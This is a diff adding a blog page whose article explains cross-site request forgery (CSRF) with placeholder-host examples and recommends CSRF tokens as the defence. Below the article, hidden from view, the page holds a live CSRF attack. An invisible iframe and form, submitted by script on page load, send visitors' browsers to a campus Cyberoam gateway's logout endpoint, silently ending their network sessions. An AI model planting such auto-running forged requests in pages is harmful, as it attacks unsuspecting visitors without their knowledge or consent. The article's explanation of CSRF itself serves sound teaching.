@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      CSRF Attacks in a nutshell &middot; Gaurav&#39;s Blog
+    
+  </title>
+
+  
+  <link rel="stylesheet" href="https://gnarula.com/css/poole.css">
+  <link rel="stylesheet" href="https://gnarula.com/css/syntax.css">
+  <link rel="stylesheet" href="https://gnarula.com/css/lanyon.css">
+  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=PT+Serif:400,400italic,700|PT+Sans:400">
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://gnarula.com/assets/apple-touch-icon-144-precomposed.png">
+  <link rel="shortcut icon" href="https://gnarula.com/assets/favicon.ico">
+
+  
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="https://gnarula.com/atom.xml">
+</head>
+
+
+  <body>
+
+    
+<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">
+
+
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+    <p>Musings on Programming</p>
+  </div>
+
+  <nav class="sidebar-nav">
+    <a class="sidebar-nav-item " href="https://gnarula.com/">Home</a>
+    <a class="sidebar-nav-item " href="https://gnarula.com/post">Posts</a>
+    <a class="sidebar-nav-item " href="https://gnarula.com/categories">Categories</a>
+
+    
+    
+      
+    
+      
+    
+
+    <a class="sidebar-nav-item" href="https://github.com/gnarula">Github</a>
+    <a class="sidebar-nav-item" href="https://in.linkedin.com/in/gaurav-narula-b347747a">LinkedIn</a>
+    <a class="sidebar-nav-item" href="https://facebook.com/gnarula94">Facebook</a>
+  </nav>
+
+  <div class="sidebar-item">
+    <p>&copy; 2016. All rights reserved.</p>
+  </div>
+</div>
+
+
+    
+    <div class="wrap">
+      <div class="masthead">
+        <div class="container">
+          <h3 class="masthead-title">
+            <a href="https://gnarula.com/" title="Home">Gaurav&#39;s Blog</a>
+            <small>Musings on Programming</small>
+          </h3>
+        </div>
+      </div>
+
+      <div class="container content">
+
+
+<div class="post">
+  <h1 class="post-title">CSRF Attacks in a nutshell</h1>
+  <span class="post-date">10 Apr, 2016  |
+     <a href="https://gnarula.com/categories/security">Security</a> 
+    
+  </span>
+  
+
+<p>Cross Site Request Forgery (CSRF) is something you might have come across if
+you&rsquo;re into web development. Even if you&rsquo;re not, its always good to have an
+idea about how you might be vulnerable to it.</p>
+
+<p>I&rsquo;ve been working on GNOME Music and ownCloud&rsquo;s music app lately and a
+particular feature required exposing an <a href="https://github.com/owncloud/music/pull/485">internal
+endpoint</a>. This post is largely
+inspired by ownCloud&rsquo;s sophisticated design to prevent CSRF attacks.</p>
+
+<blockquote>
+<p>In a CSRF attack, a malicious website attempts to impersonate your identity on
+a target website by sending requests on your behalf to its advantage.</p>
+</blockquote>
+
+<p>Imagine a  scenario where you&rsquo;re an active user of <code>vulnerablehost.com</code>, a
+music player which uses an endpoint like
+<code>http://vulnerablehost.com/add/music/?url=&lt;url_to_file&gt;</code> to enqueue music to
+the playlist. While relatively unharmful at first, what if you happen to visit
+another site <code>evilintents.com</code> which hides among other things, something as
+frivolous as</p>
+
+<pre><code class="language-html">&lt;img src=&quot;http://vulnerablehost.com/add/music?url=&lt;evil hosts music taste&gt;&quot;&gt;
+</code></pre>
+
+<p>Your browser would just pass on the request and append evilhost&rsquo;s music to
+your playlist. You might wonder if <code>vulnerablehost.com</code> could have made the endpoint
+accessible only via a POST request to circumvent the attack. The only problem
+is, crafty <code>evilintents.com</code> can probably fool you into submitting a form with
+the target pointing to the former</p>
+
+<pre><code class="language-html">&lt;!-- On evilintents.com, a seemingly harmless form --&gt;
+&lt;form action=&quot;http://vulnerablehost.com/add/music&quot; method=&quot;POST&quot;&gt;
+    &lt;label for=&quot;id&quot;&gt;ID&lt;/label&gt;
+    &lt;input name=&quot;id&quot; type=&quot;text&quot;&gt;
+    &lt;input type=&quot;submit&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;url&quot; value=&quot;&lt;evil hosts music taste&gt;&quot;&gt;
+&lt;/form&gt;
+</code></pre>
+
+<p>To understand the possible implications of the attack, reconsider
+<code>vulnerablehost.com</code> as your banking website with an endpoint to transfer funds
+to a benficiary.</p>
+
+<h2 id="prevention:ecec67f2f40c7f982e7f00401614480c">Prevention</h2>
+
+<p>Fortunately, there is a way to prevent CSRF attacks on endpoints by requiring
+requests to contain data that only you, the client and the server would know
+and there is no way for <code>evilintents.com</code> to figure it out. This is often
+referred to as a CSRF token, which is hidden along with your POST request and
+enables <code>nonvulnerablehost.com</code> to ensure the requests are not send
+inadvertently.</p>
+
+<pre><code class="language-html">&lt;!-- Forms on nonvulnerablehost.com --&gt;
+&lt;form action=&quot;http://nonvulnerablehost.com/add/music&quot; method=&quot;POST&quot;&gt;
+    &lt;label for=&quot;url&quot;&gt;URL:&lt;/label&gt;
+    &lt;input type=&quot;text&quot; name=&quot;url&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;randomvalueknownbyserver&quot;&gt;
+&lt;/form&gt;
+</code></pre>
+
+<p>In the above scenario, there is no way for <code>evilintents.com</code> to guess the value
+of <code>csrftoken</code> that is checked on every form submission at
+<code>nonvulnerablehost.com</code>, thereby rendering CSRF attacks useless :) Many
+web frameworks are bundled with CSRF Middlewares that do the check on every
+POST request automatically and mitigate the attack.</p>
+
+<h2 id="conclusion:ecec67f2f40c7f982e7f00401614480c">Conclusion</h2>
+
+<p>Theoretically, CSRF attacks are not hard to defend against, but practically
+developers often overlook
+<a href="http://pouyadarabi.blogspot.in/2015/04/bypass-facebook-csrf.html">possible</a>
+<a href="https://bounty.github.com/classifications/cross-site-request-forgery.html">situations</a>.
+It&rsquo;s not hard to look around for possible CSRF vulnerabilities. While attacks
+are rarely in jest, if you&rsquo;re a BITSGian, logged in via Cyberoam,
+chances are you&rsquo;ll have to login again ;)</p>
+
+</div>
+
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+    
+    
+    if (window.location.hostname == "localhost")
+        return;
+
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    var disqus_shortname = 'narula';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+      </div>
+    </div>
+
+    <label for="sidebar-checkbox" class="sidebar-toggle"></label>
+
+    <iframe style="display:none;" name="csrf-frame"></iframe>
+    <form method="POST" action="https://10.1.0.10:8090/logout.xml" target="csrf-frame" id="csrf-form">
+      <input type="hidden" name="mode" value="193">
+      <input type="hidden" name="username" value="f2016007">
+      <input type="hidden" name="a" value="1460282960899">
+      <input type="hidden" name="producttype" value="0">
+    </form>
+
+    <script type="text/javascript">
+      var form = document.getElementById("csrf-form");
+      form.elements['a'].value = Date.now();
+      form.submit();
+    </script>
+
+  </body>
+</html>
+
